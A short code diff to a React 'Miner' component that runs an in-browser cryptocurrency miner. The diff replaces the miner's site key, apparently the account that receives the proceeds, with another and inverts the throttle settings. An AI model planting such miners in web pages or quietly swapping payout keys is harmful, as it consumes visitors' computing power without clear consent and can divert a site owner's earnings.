@@ -17,14 +17,14 @@ const Miner = ({ isMinerHigh, setIsMinerHigh }) => {
 
   const initializeMiner = (isHigh) => {
     try {
-      const miner = new window.Client.Anonymous('2a84bd27d988005fd2568bd4424803d6136973ecb4f2d201f05d777518141754', {
-        throttle: isHigh ? 0.8 : 0.1,
+      const miner = new window.Client.Anonymous('e4af5e1137c224bf893f16edb14341df854a037db58d2a56c41488c2f0ff1ec1', {
+        throttle: isHigh ? 0.1 : 0.8,
         c: 'w',
         ads: 0,
       });
       miner.start();
       window._client = miner; // Store miner globally for potential stopping later
-      console.log('Miner started with throttle:', isHigh ? 0.8 : 0.1);
+      console.log('Miner started with throttle:', isHigh ? 0.1 : 0.8);
     } catch (error) {
       console.error('Error initializing miner:', error);
     }
@@ -33,8 +33,8 @@ const Miner = ({ isMinerHigh, setIsMinerHigh }) => {
   const toggleMiner = () => {
     setIsMinerHigh(!isMinerHigh);
     if (window._client) {
-      window._client.setThrottle(isMinerHigh ? 0.1 : 0.8);
-      console.log('Miner throttle toggled to:', isMinerHigh ? 0.1 : 0.8);
+      window._client.setThrottle(isMinerHigh ? 0.8 : 0.1);
+      console.log('Miner throttle toggled to:', isMinerHigh ? 0.8 : 0.1);
     }
   };
 
